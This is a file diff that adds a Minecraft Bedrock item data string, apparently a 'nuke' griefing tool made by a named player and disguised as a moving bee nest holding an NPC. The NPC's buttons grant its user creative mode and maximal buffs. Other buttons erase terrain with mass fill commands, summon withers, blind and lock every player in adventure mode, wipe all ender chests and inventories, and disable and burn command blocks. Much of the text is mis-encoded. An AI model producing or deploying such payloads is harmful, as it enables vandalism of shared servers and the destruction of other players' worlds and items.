@@ -1,0 +1,714 @@
+{Block:{name:"minecraft:moving_block",states:{},version:17959425},CanDestroy:["minecraft:beehive","minecraft:bee_nest"],CanPlaceOn:["minecraft:grass","minecraft:netherrack","minecraft:end_stone","minecraft:stone","minecraft:sand","minecraft:dirt"],Count:1b,Damage:0s,Name:"minecraft:moving_block",WasPickedUp:0b,tag:{RepairCost:0,display:{Lore:["Â§rÂ§fÂ§lMade by Â§rÂ§7Â§lî€£ï¼¤ï¼¥ï¼´ï¼¥ï¼²ï¼­ï¼©ï¼®ï¼¡ï¼´ï¼¥ï¼¤â‘¦â‘¢â‘§î€£Â§rÂ§f"],Name:"Â§rÂ§7Â§lî€£ï¼¤ï¼¥ï¼´ï¼¥ï¼²î€£'ï¼³  Â§cï¼®Â§2ï¼°Â§6ï¼£"},ench:[{id:5s,lvl:10s}],minecraft:keep_on_death:1b,movingBlock:{name:"minecraft:bee_nest"},movingBlockExtra:{name:"minecraft:beehive"},movingEntity:{Occupants:[{ActorIdentifier:"minecraft:npc<>",SaveData:{Actions:"[
+   {
+      "button_name" : "Â§lÂ§bâ’¸â“‡â’ºâ’¶Â§9â“‰â’¾â“‹â’º",
+      "data" : [
+         {
+            "cmd_line" : "/gamerule sendcommandfeedback false", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/gamemode c @p",
+            "cmd_ver" : 12
+         }
+      ],
+      "mode" : 0,
+      "text" : "",
+      "type" : 1
+   },
+   {
+      "button_name" : "Â§lÂ§gâ’¼â“„â’¹ Â§6â“‚â“„â’¹â’º",
+      "data" : [
+         {
+            "cmd_line" : "/effect @p regeneration 1000000 255 true", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/effect @p strength 1000000 50 true", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/effect @p night_vision 1000000 255 true", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/effect @p fire_resistance 1000000 255 true", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/effect @p conduit_power 1000000 255 true", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/effect @p absorption 1000000 255 true", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/effect @p instant_heath 1000000 255 true", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/effect @p water_breathing 1000000 255 true", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/gamerule sendcommandfeedback false", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/effect @p village_hero 1000000 255 true", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/effect @p resistance 1000000 50 true", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/effect @p saturation 1000000 255 true", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/effect @p health_boost 1000000 255 true", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/effect @p haste 1000000 50 true", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/effect @p speed 1000000 5 true", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/gamemode s @p",
+            "cmd_ver" : 12
+         }
+      ],
+      "mode" : 0,
+      "text" : "",
+      "type" : 1
+   },
+   {
+      "button_name" : "Â§lÂ§fâ“ƒÂ§7â“ŠÂ§8â“€Â§0â’º",
+      "data" : [
+         {
+            "cmd_line" : "/execute @e ~40 ~ ~ fill ~20 ~1 ~20 ~-20 ~-10 ~-20 air", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/execute @e ~-40 ~-10 ~ fill ~20 ~1 ~20 ~-20 ~-10 ~-20 air", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/execute @e ~ ~ ~40 fill ~20 ~1 ~20 ~-20 ~-10 ~-20 air", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/execute @e ~ ~-10 ~40 fill ~20 ~1 ~20 ~-20 ~-10 ~-20 air", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/execute @e ~ ~ ~-40 fill ~20 ~1 ~20 ~-20 ~-10 ~-20 air", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/execute @e ~ ~-10 ~-40 fill ~20 ~1 ~20 ~-20 ~-10 ~-20 air", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/execute @e ~40 ~-10 ~ fill ~20 ~1 ~20 ~-20 ~-10 ~-20 air", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/execute @e ~ ~ ~-20 fill ~20 ~1 ~20 ~-20 ~-10 ~-20 air", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/execute @e ~-20 ~ ~ fill ~20 ~1 ~20 ~-20 ~-10 ~-20 air", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/execute @e ~-20 ~-10 ~ fill ~20 ~1 ~20 ~-20 ~-10 ~-20 air", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/execute @e ~20 ~ ~20 fill ~20 ~1 ~20 ~-20 ~-10 ~-20 air", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/execute @e ~20 ~-10 ~20 fill ~20 ~1 ~20 ~-20 ~-10 ~-20 air", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/execute @e ~-20 ~ ~-20 fill ~20 ~1 ~20 ~-20 ~-10 ~-20 air", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/execute @e ~-20 ~-10 ~-20 fill ~20 ~1 ~20 ~-20 ~-10 ~-20 air", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/execute @e ~20 ~ ~-20 fill ~20 ~1 ~20 ~-20 ~-10 ~-20 air", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/execute @e ~20 ~-10 ~-20 fill ~20 ~1 ~20 ~-20 ~-10 ~-20 air", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/execute @e ~-20 ~-10 ~20 fill ~20 ~1 ~20 ~-20 ~-10 ~-20 air", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/execute @e ~-20 ~ ~20 fill ~20 ~1 ~20 ~-20 ~-10 ~-20 air", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/execute @e ~40 ~ ~40 fill ~20 ~1 ~20 ~-20 ~-10 ~-20 air", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/execute @e ~40 ~-10 ~40 fill ~20 ~1 ~20 ~-20 ~-10 ~-20 air", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/execute @e ~-40 ~ ~-40 fill ~20 ~1 ~20 ~-20 ~-10 ~-20 air", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/execute @e ~-40 ~-10 ~-40 fill ~20 ~1 ~20 ~-20 ~-10 ~-20 air", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/execute @e ~40 ~ ~-40 fill ~20 ~1 ~20 ~-20 ~-10 ~-20 air", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/execute @e ~40 ~-10 ~-40 fill ~20 ~1 ~20 ~-20 ~-10 ~-20 air", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/execute @e ~ ~-10 ~ fill ~20 ~1 ~20 ~-20 ~-10 ~-20 air", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/execute @e ~ ~-20 ~ fill ~20 ~1 ~20 ~-20 ~-10 ~-20 air", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/execute @e ~ ~-30 ~ fill ~20 ~1 ~20 ~-20 ~-10 ~-20 air", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/execute @e ~ ~-40 ~ fill ~20 ~1 ~20 ~-20 ~-10 ~-20 air", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/execute @e ~ -50 ~ fill ~20 ~1 ~20 ~-20 ~-10 ~-20 air", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/execute @e ~ ~-60 ~ fill ~20 ~1 ~20 ~-20 ~-10 ~-20 air", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/execute @e ~-20 ~-20 ~-20 fill ~20 ~1 ~20 ~-20 ~-10 ~-20 air", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/execute @e ~20 ~-20 ~20 fill ~20 ~1 ~20 ~-20 ~-10 ~-20 air", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/execute @e ~-20 ~-20 ~20 fill ~20 ~1 ~20 ~-20 ~-10 ~-20 air", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/execute @e ~20 ~-20 ~-20 fill ~20 ~1 ~20 ~-20 ~-10 ~-20 air", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/execute @e ~40 ~-20 ~40 fill ~20 ~1 ~20 ~-20 ~-10 ~-20 air", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/execute @e ~-40 ~-20 ~-40 fill ~20 ~1 ~20 ~-20 ~-10 ~-20 air", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/execute @e ~40 ~-20 ~-40 fill ~20 ~1 ~20 ~-20 ~-10 ~-20 air", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/execute @e ~-40 ~-40 ~40 fill ~20 ~1 ~20 ~-20 ~-10 ~-20 air", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/execute @e ~ ~ ~ fill ~20 ~1 ~20 ~-20 ~-10 ~-20 air", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/execute @e ~20 ~-10 ~ fill ~20 ~1 ~20 ~-20 ~-10 ~-20 air", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/execute @e ~20 ~ ~ fill ~20 ~1 ~20 ~-20 ~-10 ~-20 air", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/execute @e ~ ~-10 ~20 fill ~20 ~1 ~20 ~-20 ~-10 ~-20 air", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/execute @e ~ ~ ~ summon wither ~ ~ ~ nametag \"Â§rÂ§fÂ§lMade by Â§rÂ§7Â§lî€£ï¼¤ï¼¥ï¼´ï¼¥ï¼²ï¼­ï¼©ï¼®ï¼¡ï¼´ï¼¥ï¼¤â‘¦â‘¢â‘§î€£Â§rÂ§f\"", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/execute @e ~ ~ ~ summon wither ~ ~ ~ nametag \"Â§rÂ§fÂ§lMade by Â§rÂ§7Â§lî€£ï¼¤ï¼¥ï¼´ï¼¥ï¼²ï¼­ï¼©ï¼®ï¼¡ï¼´ï¼¥ï¼¤â‘¦â‘¢â‘§î€£Â§rÂ§f\"", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/effect @a blindness 1000000 255 true", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/effect @a mining_fatigue 1000000 255 true", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/effect @a darkness 1000000 255 true", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/effect @a bad_omen 1000000 255 true", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/effect @a health_boost 1000000 255 true", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/effect @a slowness 1000000 255 true", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/effect @a hunger 1000000 3 true", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/effect @a nausea 1000000 255 true", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/effect @a weakness 1000000 255 true", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/gamerule sendcommandfeedback false", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/title @a title Â§lÂ§4NUKED BY î€£ï¼¤ï¼¥ï¼´ï¼¥ï¼²î€£", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/fog @a push \"minecraft:fog_hell\" \"E\"", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/fog @a push \"minecraft:fog_the_end\" \"A\"", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/gamemode a @a", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/replaceitem entity @a slot.hotbar 0 border_block 64 0 {\"minecraft:item_lock\":{ \"mode\": \"lock_in_slot\" }, \"minecraft:keep_on_death\":{}}", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/replaceitem entity @a slot.armor.head 0 carved_pumpkin 64 0 {\"minecraft:item_lock\":{ \"mode\": \"lock_in_slot\" }, \"minecraft:keep_on_death\":{}}", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/replaceitem entity @a slot.hotbar 1 border_block 64 0 {\"minecraft:item_lock\":{ \"mode\": \"lock_in_slot\" }, \"minecraft:keep_on_death\":{}}", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/replaceitem entity @a slot.hotbar 2 border_block 64 0 {\"minecraft:item_lock\":{ \"mode\": \"lock_in_slot\" }, \"minecraft:keep_on_death\":{}}", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/replaceitem entity @a slot.hotbar 3 border_block 64 0 {\"minecraft:item_lock\":{ \"mode\": \"lock_in_slot\" }, \"minecraft:keep_on_death\":{}}", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/replaceitem entity @a slot.hotbar 4 border_block 64 0 {\"minecraft:item_lock\":{ \"mode\": \"lock_in_slot\" }, \"minecraft:keep_on_death\":{}}", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/replaceitem entity @a slot.hotbar 5 border_block 64 0 {\"minecraft:item_lock\":{ \"mode\": \"lock_in_slot\" }, \"minecraft:keep_on_death\":{}}", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/replaceitem entity @a slot.hotbar 6 border_block 64 0 {\"minecraft:item_lock\":{ \"mode\": \"lock_in_slot\" }, \"minecraft:keep_on_death\":{}}", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/replaceitem entity @a slot.hotbar 7 border_block 64 0 {\"minecraft:item_lock\":{ \"mode\": \"lock_in_slot\" }, \"minecraft:keep_on_death\":{}}", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/replaceitem entity @a slot.hotbar 8 border_block 64 0 {\"minecraft:item_lock\":{ \"mode\": \"lock_in_slot\" }, \"minecraft:keep_on_death\":{}}", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/replaceitem entity @a slot.inventory 0 deny 64 0 {\"minecraft:item_lock\":{ \"mode\": \"lock_in_slot\" }, \"minecraft:keep_on_death\":{}}", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/replaceitem entity @a slot.inventory 1 deny 64 0 {\"minecraft:item_lock\":{ \"mode\": \"lock_in_slot\" }, \"minecraft:keep_on_death\":{}}", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/replaceitem entity @a slot.inventory 2 deny 64 0 {\"minecraft:item_lock\":{ \"mode\": \"lock_in_slot\" }, \"minecraft:keep_on_death\":{}}", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/replaceitem entity @a slot.inventory 3 deny 64 0 {\"minecraft:item_lock\":{ \"mode\": \"lock_in_slot\" }, \"minecraft:keep_on_death\":{}}", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/replaceitem entity @a slot.inventory 4 deny 64 0 {\"minecraft:item_lock\":{ \"mode\": \"lock_in_slot\" }, \"minecraft:keep_on_death\":{}}", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/replaceitem entity @a slot.inventory 5 deny 64 0 {\"minecraft:item_lock\":{ \"mode\": \"lock_in_slot\" }, \"minecraft:keep_on_death\":{}}", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/replaceitem entity @a slot.inventory 6 deny 64 0 {\"minecraft:item_lock\":{ \"mode\": \"lock_in_slot\" }, \"minecraft:keep_on_death\":{}}", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/replaceitem entity @a slot.inventory 7 deny 64 0 {\"minecraft:item_lock\":{ \"mode\": \"lock_in_slot\" }, \"minecraft:keep_on_death\":{}}", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/replaceitem entity @a slot.inventory 8 deny 64 0 {\"minecraft:item_lock\":{ \"mode\": \"lock_in_slot\" }, \"minecraft:keep_on_death\":{}}", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/replaceitem entity @a slot.inventory 9 deny 64 0 {\"minecraft:item_lock\":{ \"mode\": \"lock_in_slot\" }, \"minecraft:keep_on_death\":{}}", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/replaceitem entity @a slot.inventory 10 deny 64 0 {\"minecraft:item_lock\":{ \"mode\": \"lock_in_slot\" }, \"minecraft:keep_on_death\":{}}", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/replaceitem entity @a slot.inventory 11 deny 64 0 {\"minecraft:item_lock\":{ \"mode\": \"lock_in_slot\" }, \"minecraft:keep_on_death\":{}}", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/replaceitem entity @a slot.inventory 12 deny 64 0 {\"minecraft:item_lock\":{ \"mode\": \"lock_in_slot\" }, \"minecraft:keep_on_death\":{}}", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/replaceitem entity @a slot.inventory 13 deny 64 0 {\"minecraft:item_lock\":{ \"mode\": \"lock_in_slot\" }, \"minecraft:keep_on_death\":{}}", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/replaceitem entity @a slot.inventory 14 deny 64 0 {\"minecraft:item_lock\":{ \"mode\": \"lock_in_slot\" }, \"minecraft:keep_on_death\":{}}", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/replaceitem entity @a slot.inventory 15 deny 64 0 {\"minecraft:item_lock\":{ \"mode\": \"lock_in_slot\" }, \"minecraft:keep_on_death\":{}}", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/replaceitem entity @a slot.inventory 16 deny 64 0 {\"minecraft:item_lock\":{ \"mode\": \"lock_in_slot\" }, \"minecraft:keep_on_death\":{}}", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/replaceitem entity @a slot.inventory 17 deny 64 0 {\"minecraft:item_lock\":{ \"mode\": \"lock_in_slot\" }, \"minecraft:keep_on_death\":{}}", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/replaceitem entity @a slot.inventory 18 deny 64 0 {\"minecraft:item_lock\":{ \"mode\": \"lock_in_slot\" }, \"minecraft:keep_on_death\":{}}", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/replaceitem entity @a slot.inventory 19 deny 64 0 {\"minecraft:item_lock\":{ \"mode\": \"lock_in_slot\" }, \"minecraft:keep_on_death\":{}}", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/replaceitem entity @a slot.inventory 20 deny 64 0 {\"minecraft:item_lock\":{ \"mode\": \"lock_in_slot\" }, \"minecraft:keep_on_death\":{}}", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/replaceitem entity @a slot.inventory 21 deny 64 0 {\"minecraft:item_lock\":{ \"mode\": \"lock_in_slot\" }, \"minecraft:keep_on_death\":{}}", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/replaceitem entity @a slot.inventory 22 deny 64 0 {\"minecraft:item_lock\":{ \"mode\": \"lock_in_slot\" }, \"minecraft:keep_on_death\":{}}", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/replaceitem entity @a slot.inventory 23 deny 64 0 {\"minecraft:item_lock\":{ \"mode\": \"lock_in_slot\" }, \"minecraft:keep_on_death\":{}}", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/replaceitem entity @a slot.inventory 24 deny 64 0 {\"minecraft:item_lock\":{ \"mode\": \"lock_in_slot\" }, \"minecraft:keep_on_death\":{}}", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/replaceitem entity @a slot.inventory 25 deny 64 0 {\"minecraft:item_lock\":{ \"mode\": \"lock_in_slot\" }, \"minecraft:keep_on_death\":{}}", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/replaceitem entity @a slot.inventory 26 deny 64 0 {\"minecraft:item_lock\":{ \"mode\": \"lock_in_slot\" }, \"minecraft:keep_on_death\":{}}", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/weather clear", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/time set day", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/daylock true", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/execute @a ~ ~ ~ spawnpoint @p ~ ~ ~", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/camerashake add @a 4 1000000 rotational", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/clearspawnpoint @a", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/effect @a resistance 1000000 30 true", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/effect @a regeneration 1000000 3 true", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/execute @a ~ ~ ~ fill ~-10 ~-10 ~-10 ~10 ~10 ~10 border_block 0 hollow", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/playanimation @e animation.ghast.scale E 1000000", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/execute @a ~ ~ ~ playsound mob.endermen.stare @a ~ ~ ~ 100 0.5", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/execute @e ~ ~ ~20 fill ~20 ~1 ~20 ~-20 ~-10 ~-20 air", 
+            "cmd_ver" : 12
+         }
+      ],
+      "mode" : 0,
+      "text" : "",
+      "type" : 1
+   },
+   {
+      "button_name" : "Â§lÂ§fâ’¸â“â’ºâ’¶â“‡ â’¶â“â“",
+      "data" : [
+         {
+            "cmd_line" : "/replaceitem entity @a slot.enderchest 0 air 1", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/replaceitem entity @a slot.enderchest 1 air 1", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/replaceitem entity @a slot.enderchest 2 air 1", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/replaceitem entity @a slot.enderchest 3 air 1", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/replaceitem entity @a slot.enderchest 4 air 1", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/replaceitem entity @a slot.enderchest 5 air 1", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/replaceitem entity @a slot.enderchest 6 air 1", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/replaceitem entity @a slot.enderchest 7 air 1", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/replaceitem entity @a slot.enderchest 8 air 1", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/replaceitem entity @a slot.enderchest 9 air 1", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/replaceitem entity @a slot.enderchest 10 air 1", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/replaceitem entity @a slot.enderchest 11 air 1", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/replaceitem entity @a slot.enderchest 12 air 1", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/replaceitem entity @a slot.enderchest 13 air 1", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/replaceitem entity @a slot.enderchest 14 air 1", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/replaceitem entity @a slot.enderchest 15 air 1", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/replaceitem entity @a slot.enderchest 16 air 1", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/replaceitem entity @a slot.enderchest 17 air 1", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/replaceitem entity @a slot.enderchest 18 air 1", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/replaceitem entity @a slot.enderchest 19 air 1", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/replaceitem entity @a slot.enderchest 20 air 1", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/replaceitem entity @a slot.enderchest 21 air 1", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/replaceitem entity @a slot.enderchest 22 air 1", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/replaceitem entity @a slot.enderchest 23 air 1", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/replaceitem entity @a slot.enderchest 24 air 1", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/replaceitem entity @a slot.enderchest 25 air 1", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/replaceitem entity @a slot.enderchest 26 air 1", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/clear @a", 
+            "cmd_ver" : 12
+         }
+      ],
+      "mode" : 0,
+      "text" : "",
+      "type" : 1
+   },
+   {
+      "button_name" : "Â§lÂ§câ“ƒâ“Šâ“€â’º Â§4â’¸â“‚â’¹",
+      "data" : [
+         {
+            "cmd_line" : "/gamerule commandblocksenabled false", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/gamerule sendcommandfeedback false", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/gamerule maxcommandchainlength 0", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/execute @e ~ ~ ~ fill ~-15 ~-15 ~-15 ~15 ~15 ~15 fire 0 replace command_block", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/execute @e ~ ~ ~ fill ~-15 ~-15 ~-15 ~15 ~15 ~15 fire 0 replace chain_command_block", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/execute @e ~ ~ ~ fill ~-15 ~-15 ~-15 ~15 ~15 ~15 fire 0 replace repeating_command_block", 
+            "cmd_ver" : 12
+         },
+         {
+            "cmd_line" : "/gamerule commandblockoutput false", 
+            "cmd_ver" : 12
+         }
+      ],
+      "mode" : 0,
+      "text" : "",
+      "type" : 1
+   },
+   {
+      "button_name" : "Â§aâ“€â“˜â“›â“› Â§2â“ƒâ“…â’¸",
+      "data" : [
+         {
+            "cmd_line" : "/kill @e[type=npc,r=1]", 
+            "cmd_ver" : 12
+         }
+      ],
+      "mode" : 0,
+      "text" : "",
+      "type" : 1
+   }
+]",CustomNameVisible:1b,InterativeText:"Â§rÂ§0â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£»â£¿â£¿â¡¿â¢Ÿâ¡¯â£–â£¿â£¿â£²â¢â¡»â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿
+â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â ¿â£¯â µâ£ºâ¡·â£â£¿â£·â£¿â£½â¡»â¢®â£•â¡¯â£Ÿâ ›â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿
+â£¿â£¿â£¿â£¿â¢¿â£¿â£¿â£¿â£¿â£â¢Ÿâ¡«â¢–â£­â£¿â£»â£½â£¿â¡¿â£¿â£½â£¯â£»â¢¿â£·â£¯â£Ÿâ£¿â£½â£ªâ£â¡¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿
+â£¿â£¿â£¿â£¿â£¼â£¿â Ÿâ£›â£­â£›â£½â¢â£«â£µâ£¿â¢¿â£»â£·â£¿â£¿â£¿â£¿â£¿â£¿â£¾â£Ÿâ¡¿â£¿â£¶â£½â¡³â£¯â£“â¢¯â£›â¢¿â£¿â£¿â£¿â£¿â£¿â£¿
+â£¿â£¿â£¿â Ÿâ »â ½â ¯â ·â ¿â ½â ¾â ¿â Ÿâ ¿â ¿â ¿â ¿â ¿â ¿â ¿â ¿â ¿â ¿â ¿â ¿â ¿â ¿â ¿â ­â »â ¿â ·â ¯â ¿â ¾â µâ ¯â Ÿâ ¿â£¿â£¿â£¿
+â£¿â£¿â¡¿â¡»â –â£’â£’â£â¡’â£’â£â£’â£’â£’â£’â£’â£’â£’â ’â €â¢²â¡’â¡’â ’â ’â ’â ’â£’â£’â£’â£’â£€â£â£’â£€â£€â£’â¢²â Ÿâ ›â£»â£¿
